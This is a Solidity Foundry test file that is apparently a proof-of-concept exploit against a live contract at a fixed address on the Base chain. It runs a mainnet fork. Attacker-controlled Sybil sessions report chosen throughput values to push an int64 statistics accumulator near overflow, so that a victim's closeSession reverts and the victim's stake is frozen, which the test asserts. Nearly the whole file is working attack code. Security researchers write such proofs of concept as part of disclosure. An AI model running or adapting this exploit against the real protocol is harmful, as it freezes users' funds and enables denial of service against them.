// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address,uint256) external returns(bool); }
interface ILum {
    function getToken() external view returns (address);
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(address modelOwner_, bytes32 baseModelId_, bytes32 ipfsCID_, uint256 fee_, uint256 amount_, string calldata name_, string[] calldata tags_) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(address user_, uint256 amount_, bool isDirectPaymentFromUser_, bytes calldata approvalEncoded_, bytes calldata signature_) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
}

contract StatsBrick is Test {
    ILum constant L = ILum(0x6aBE1d282f72B474E54527D93b979A4f64d3030a);
    IERC20 MOR;
    int64 constant XMAX = 2147483647;
    int64 constant IMAX = 9223372036854775807;

    address attacker; uint256 attackerPk;
    address victim; uint256 victimPk;
    bytes32 modelId; bytes32 bidId;
    uint256 constant PRICE = 10000000000; // bidMin (1e10)

    // local mirror of prStats.tpsScaled1000 SD to precompute crafted tps
    int64 mMean; int64 mSqSum;
    function _mirrorAdd(int64 x, int64 c) internal {
        int64 om = mMean; mMean = mMean + (x - mMean)/c; mSqSum = mSqSum + (x - mMean)*(x - om);
    }
    function _isqrt(uint256 n) internal pure returns(uint256 x){ if(n==0)return 0; x=n; uint256 y=(x+1)/2; while(y<x){x=y;y=(x+n/x)/2;} }

    function _sign(uint256 pk, bytes memory enc) internal pure returns (bytes memory) {
        bytes32 h = keccak256(enc);
        bytes32 eth = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, eth);
        return abi.encodePacked(r, s, v);
    }

    function _openClose(address who, uint256 pk, uint32 tps) internal returns (bool closedOk) {
        uint256 amount = 2e15; // ~0.002 MOR -> duration ~ few hundred s at min price
        // approval: (bidId, chainId, address(0), timestamp) signed by provider(attacker)
        bytes memory approval = abi.encode(bidId, block.chainid, address(0), uint128(block.timestamp));
        bytes memory aSig = _sign(attackerPk, approval); // provider = attacker signs
        vm.prank(who);
        bytes32 sid = L.openSession(who, amount, true, approval, aSig);
        vm.warp(block.timestamp + 1);
        // receipt: (sessionId, chainId, timestamp, tps, ttft=0) signed by provider(attacker)
        bytes memory receipt = abi.encode(sid, block.chainid, uint128(block.timestamp), tps, uint32(0));
        bytes memory rSig = _sign(attackerPk, receipt);
        vm.prank(who);
        try L.closeSession(receipt, rSig) { closedOk = true; } catch { closedOk = false; }
    }

    function test_stats_brick_freezes_victim() public {
        vm.createSelectFork("https://base-rpc.publicnode.com");
        MOR = IERC20(L.getToken());
        (attacker, attackerPk) = makeAddrAndKey("ATTACKER");
        (victim, victimPk) = makeAddrAndKey("VICTIM");
        deal(address(MOR), attacker, 1000e18);
        deal(address(MOR), victim, 1000e18);
        vm.prank(attacker); MOR.approve(address(L), type(uint256).max);
        vm.prank(victim); MOR.approve(address(L), type(uint256).max);

        // setup: provider + model + bid (all by attacker)
        vm.prank(attacker); L.providerRegister(attacker, 1e18, "http://a");
        string[] memory tags = new string[](0);
        vm.prank(attacker); L.modelRegister(attacker, bytes32("m1"), bytes32("cid"), 0, 1e18, "m", tags);
        modelId = L.getModelId(attacker, bytes32("m1"));
        vm.prank(attacker); bidId = L.postModelBid(attacker, modelId, PRICE);

        // Attacker Sybil sessions to corrupt prStats.tpsScaled1000 (count = successCount = session#)
        uint64 setupSessions = 0;
        for (uint256 i = 1; i <= 80; i++) {
            int64 c = int64(uint64(i));
            int64 tpsSigned;
            if (i == 1) tpsSigned = XMAX;
            else if (i == 2) tpsSigned = -XMAX;
            else {
                int64 margin = IMAX - mSqSum;
                if (margin < 50000) { break; }
                int64 d = int64(int256(_isqrt(uint256(int256(margin)) * 9 / 10)));
                if (d < 1) d = 1;
                tpsSigned = mMean + d;
            }
            uint32 tpsU = uint32(int32(tpsSigned)); // encode int32 (incl negative) as uint32
            bool ok = _openClose(attacker, attackerPk, tpsU);
            if (!ok) { emit log_named_uint("attacker session reverted at i", i); break; }
            _mirrorAdd(int32(tpsU), c); // mirror uses same int32 value + count
            setupSessions++;
        }
        emit log_named_uint("attacker setup sessions done", setupSessions);
        emit log_named_int("mirror sqSum", mSqSum);
        emit log_named_int("mirror margin to int64max", IMAX - mSqSum);

        // VICTIM opens a session on the attacker's bid and tries to close (normal tps=50000)
        bool victimClosed = _openClose(victim, victimPk, 50000);
        emit log_named_string("victim closeSession", victimClosed ? "SUCCEEDED (no brick)" : "REVERTED -> stake FROZEN");
        assertFalse(victimClosed, "VICTIM SHOULD BE BRICKED (stake frozen)");
    }
}
